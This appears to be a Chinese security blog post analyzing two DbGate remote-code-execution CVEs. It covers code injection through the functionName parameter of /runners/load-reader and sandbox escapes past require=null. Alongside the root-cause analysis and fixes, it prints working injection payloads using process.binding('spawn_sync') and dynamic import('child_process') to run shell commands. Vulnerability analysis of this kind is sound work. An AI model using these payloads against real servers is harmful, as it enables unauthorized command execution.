---
layout: default
title: "DbGate RCE 深度分析：functionName 代码注入 + require=null 沙箱逃逸 (CVE-2026-48017 / CVE-2026-47670)"
date: 2026-06-14
tags: [CVE分析, RCE, 代码注入, DbGate]
categories: [漏洞分析]
---

## 概述

DbGate 是一个开源的数据库管理工具（类似 DBeaver/HeidiSQL），提供 Web UI + Electron 桌面客户端。
2026年6月5日公开了两个严重级别的 RCE 漏洞，都位于 `POST /runners/load-reader` 端点，
利用同一个根本原因：**用户可控的 functionName 参数被直接拼接到 JavaScript 代码模板中**。

两个 CVE 的区别仅在于沙箱逃逸方式：

- **CVE-2026-48017** — 使用 `process.binding("spawn_sync")` 绕过 require=null
- **CVE-2026-47670** — 使用 `await import('child_process')` 绕过 require=null

## 攻击链全景

```
① POST /auth/login (获取 JWT)
    → ② POST /runners/load-reader (发送恶意 functionName)
      → ③ loaderScriptTemplate 拼接恶意 functionName 到 JS 代码
        → ④ fork() 子进程执行拼接后的 JS
          → ⑤ require=null 被 process.binding() / import() 绕过
            → ⑥ 任意命令执行（root）
```

## 漏洞代码分析

### 1. loadReader 端点 — 入口点

`packages/api/src/controllers/runners.js` 中的 `loadReader` 方法接收用户输入的 `functionName`，
不对其做任何校验，直接传给 `loaderScriptTemplate`：

```javascript
// runners.js:352-368 — loadReader 方法
loadReader({ functionName, props }) {
  const prefix = requirePluginsTemplate(
    extractShellApiPlugins(functionName, props)
  );
  const script = loaderScriptTemplate(
    prefix,
    functionName,    // ← 用户可控，无任何校验
    props,
    uuid()
  );
  return this.startCore(uuid(), script);
}
```

对比同一文件中的 `start` 方法（line 292），它要求 `run-shell-script` 权限并检查 `allowShellScripting`，而 `loadReader` 完全跳过了这些检查。

### 2. 代码模板 — 注入点

`loaderScriptTemplate` 将 functionName 直接插入了 JS 模板字符串：

```javascript
// runners.js:57-68 — 模板函数
const loaderScriptTemplate = (prefix, functionName, props, runid) => `
${prefix}
const dbgateApi = require(process.env.DBGATE_API);
dbgateApi.initializeApiEnvironment();
${requirePluginsTemplate(extractShellApiPlugins(functionName, props))}
require=null;
async function run() {
  const reader=await **${compileShellApiFunctionName(functionName)}**(${JSON.stringify(props)});
  const writer=await dbgateApi.collectorWriter({runid: '${runid}'});
  await dbgateApi.copyStream(reader, writer);
}
dbgateApi.runScript(run);
`;
```

functionName 被拼接到 `await [...]()` 调用中，如果 functionName 包含 JavaScript 语法字符就能"逃逸"出去。

### 3. compileShellApiFunctionName — 不存在的"编译"

`packages/tools/src/packageTools.ts:30-35`：

```typescript
export function compileShellApiFunctionName(functionName) {
  const nsMatch = functionName.match(/^([^@]+)@([^@]+)/);
  if (nsMatch) {
    return `${_camelCase(nsMatch[2])}.shellApi.${nsMatch[1]}`;
  }
  return `dbgateApi.**${functionName}**`;  // ← 直接拼接！
}
```

当 functionName 不包含 `@` 符号时，直接返回 `dbgateApi.${functionName}`。
没有任何字符过滤、正则校验、白名单检查。

## 攻击向量 1: process.binding 沙箱逃逸 (CVE-2026-48017)

模板中设置了 `require=null` 试图阻止 `require('child_process')`。但 **process.binding 是 Node.js 内部的 C++ 绑定，不受 JS 层变量赋值影响**。

**PoC 注入的 functionName 值：**

```javascript
"); } /* 闭合上方 await 表达式 */
/* 下面注入新代码 */
const cp = process.binding("spawn_sync");
cp.spawn({
  file: "id",
  args: ["id"],
  stdio: [
    {type:"pipe",readable:true,writable:false},
    {type:"pipe",readable:false,writable:true},
    {type:"pipe",readable:false,writable:true}
  ]
});
//
```

**为什么 process.binding 能绕过 require=null ？**

`require` 是一个函数，被赋值为 null 后确实无法调用。但 `process.binding("spawn_sync")` 返回的是 Node.js 内部 `spawn_sync` 模块的 C++ 绑定对象，提供了 `spawn()` 方法直接创建子进程。
这个 API 是 Node.js 进程模型的底层实现，不经过 require 机制。

## 攻击向量 2: import() 沙箱逃逸 (CVE-2026-47670)

另一个研究员用了更简洁的绕过方式——**动态 import()**：

```javascript
")); await import('child_process').then(cp => cp.exec('id > /tmp/pwned')); //
```

**为什么 import() 能绕过 require=null ？**

`require` 是 CommonJS 的模块加载函数，赋值为 null 不影响 ECMAScript 的 `import()` 关键字。
`import()` 是语言层面的异步动态导入语法，不是挂载在 module 变量上的方法。
DbGate 团队在 June 2025 的修复（commit cf3f95c952）中只设置了 `require=null`，
没有考虑到 import() 这个替代路径。

## 漏洞根因总结

| 层面 | 问题 |
|------|------|
| 输入验证 | functionName 是用户输入，直接拼入 JS 代码模板，无任何白名单/正则校验 |
| 缺少权限检查 | loadReader 端点没有 run-shell-script 权限检查，而同类端点 start 有 |
| 不完整的沙箱 | require=null 只封堵了 CommonJS require，process.binding 和 import() 仍可用 |
| 错误的设计模式 | 代码生成（code generation）本身就是危险模式，应改为函数注册表 + 索引查找 |

## 修复方案

1. **使用白名单验证 functionName**：只允许 `/^[a-zA-Z]+$/` 这类纯字母格式
2. **改用查找表（lookup table）**：预注册合法的 reader 函数，不拼接字符串
3. **loadReader 端点加权限检查**：与 start 端点一致的 run-shell-script 权限校验
4. **子进程降权**：Docker 容器以非 root 用户运行

## 时间线

- **2025-06** — 第一次修复：添加 require=null（commit cf3f95c952），但不完整
- **2026-06-05** — CVE-2026-48017, CVE-2026-47670, CVE-2026-47669 同时公开
- **至今** — 截至 7.1.4 版本尚未完全修复

> ⚠️ 本文仅做技术分析和安全科普，切勿用于非法用途。请在授权环境中验证。
